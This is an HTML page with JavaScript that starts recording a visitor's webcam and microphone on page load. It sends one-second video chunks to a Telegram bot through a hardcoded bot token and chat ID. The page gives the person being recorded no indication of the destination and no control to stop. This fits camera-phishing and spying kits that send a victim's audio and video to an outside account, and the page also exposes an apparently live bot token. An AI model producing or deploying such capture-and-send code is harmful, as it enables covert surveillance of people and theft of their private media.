<!doctype html>
<html>
<head>
  <title>Live Audio + Video to Telegram</title>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 20px; }
    video { border: 2px solid #333; width: 640px; height: 480px; }
    h1 { margin-top: 20px; }
  </style>
</head>
<body>
  <h1>Live Audio + Video Streaming to Telegram</h1>
  <video id="video" autoplay playsinline muted></video>

  <script>
    'use strict';

    // -----------------------------
    // CONFIGURE YOUR BOT
    // -----------------------------
    const BOT_TOKEN = "8194695937:AAHXwebWoX00SagH6LQDVkjz5P89ajvpmKE"; 
    const CHAT_ID = "8504837303"; // your Telegram user ID
    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;

    const video = document.getElementById('video');

    async function init() {
      try {
        // Access video + audio
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        handleStream(stream);
      } catch (err) {
        console.error("Error accessing webcam/mic: ", err);
        alert("Cannot access webcam/mic: " + err.message);
      }
    }

    function handleStream(stream) {
      video.srcObject = stream;

      // MediaRecorder for small compressed chunks
      const options = { mimeType: 'video/webm; codecs=vp8,opus' }; // VP8 + Opus audio
      const mediaRecorder = new MediaRecorder(stream, options);

      let sending = false;
      let queue = [];

      mediaRecorder.ondataavailable = function(event) {
        if (event.data && event.data.size > 0) {
          queue.push(event.data);
          processQueue();
        }
      };

      mediaRecorder.start(1000); // 1-second chunks for near-real-time streaming

      async function processQueue() {
        if (sending || queue.length === 0) return;
        sending = true;
        const chunk = queue.shift();
        await sendVideoToTelegram(chunk);
        sending = false;
        if (queue.length > 0) processQueue();
      }
    }

    async function sendVideoToTelegram(blob) {
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('video', blob, 'stream.webm');

      try {
        const res = await fetch(TELEGRAM_API, {
          method: 'POST',
          body: formData
        });
        if (!res.ok) console.error("Failed to send chunk:", res.statusText);
        else console.log("Sent 1-second chunk");
      } catch (err) {
        console.error("Error sending chunk:", err);
      }
    }

    // Start streaming
    init();
  </script>
</body>
</html>
